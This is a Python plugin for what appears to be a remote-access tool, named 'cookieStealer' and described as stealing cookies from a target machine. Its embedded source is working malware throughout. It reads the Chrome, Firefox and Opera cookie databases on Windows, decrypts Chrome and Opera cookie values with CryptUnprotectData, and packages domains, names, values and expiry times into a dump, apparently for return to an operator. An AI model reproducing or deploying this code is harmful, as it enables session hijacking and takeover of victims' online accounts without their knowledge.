plugin_name = r"""cookieStealer"""
plugin_description = r"""Steal Cookies From Target Machine"""
plugin_type = r"""remote"""
plugin_source = r"""
import sqlite3
import win32crypt
import glob

####SETTINGS####
chrome = 1          # 0 - off, 1 - on
firefox = 0         # 0 - off, 1 - on
opera = 0         # 0 - off, 1 - on

cprofile = 'Default'
fprofile = ''
oprofile = ''
####SETTINGS####


_SHGetFolderPath = windll.shell32.SHGetFolderPathW
_SHGetFolderPath.argtypes = [wintypes.HWND,
                            ctypes.c_int,
                            wintypes.HANDLE,
                            wintypes.DWORD, wintypes.LPCWSTR]


path_buf = wintypes.create_unicode_buffer(wintypes.MAX_PATH)

result = _SHGetFolderPath(0,28, 0, 0, path_buf)
local= path_buf.value.encode('utf-8')
result = _SHGetFolderPath(0,26, 0, 0, path_buf)
roaming =  path_buf.value.encode('utf-8')

cookies = {}

if chrome:
    # Chrome Stealer
    path = local + '\\Google\\Chrome\\User Data\\' + cprofile + '\\Cookies'
    chrome_cookie = path
    if chrome_cookie:
        connection = sqlite3.connect(chrome_cookie)
        sessions = []
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT host_key,name,encrypted_value,creation_utc,expires_utc FROM cookies')
            values = v.fetchall()
            for info in values:
                try:
                    payload = {
                            'domain': info[0],
                            'name': info[1],
                            'value': win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1],
                            'creation': info[3],
                            'expires': info[4],
                        }
                    sessions.append(payload)
                except: pass
    else:
        sessions = []
    cookies['chrome'] = sessions

if firefox:
    # Firefox Stealer
    firefox_cookie = glob.glob(os.path.join(roaming, 'Mozilla/Firefox/Profiles/*.default/cookies.sqlite'))
    if firefox_cookie:
        firefox_cookie = firefox_cookie[0]
        connection = sqlite3.connect(firefox_cookie)
        sessions = []
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT host,name,value, creationTime, expiry, name FROM moz_cookies')
            values = v.fetchall()
            for info in values:
                payload = {
                        'domain': info[0],
                        'name': info[1],
                        'value': info[2],
                        'creation': info[3],
                        'expires': info[4],
                    }
                sessions.append(payload)
    else:
        sessions = []
    cookies['firefox'] = sessions

if opera:
    # Opera Stealer
    opera_cookie = glob.glob(os.path.join(roaming, 'Opera Software/Opera*/Cookies'))
    if opera_cookie:
        opera_cookie = opera_cookie[0]
        connection = sqlite3.connect(opera_cookie)
        sessions = []
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT host_key,name,encrypted_value,creation_utc,expires_utc FROM cookies')
            values = v.fetchall()
            for info in values:
                try:
                    payload = {
                            'domain': info[0],
                            'name': info[1],
                            'value': win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1],
                            'creation': info[3],
                            'expires': info[4],
                        }
                    sessions.append(payload)
                except: pass
    else:
        sessions = []
    cookies['opera'] = sessions


mdump = str(cookies)
"""
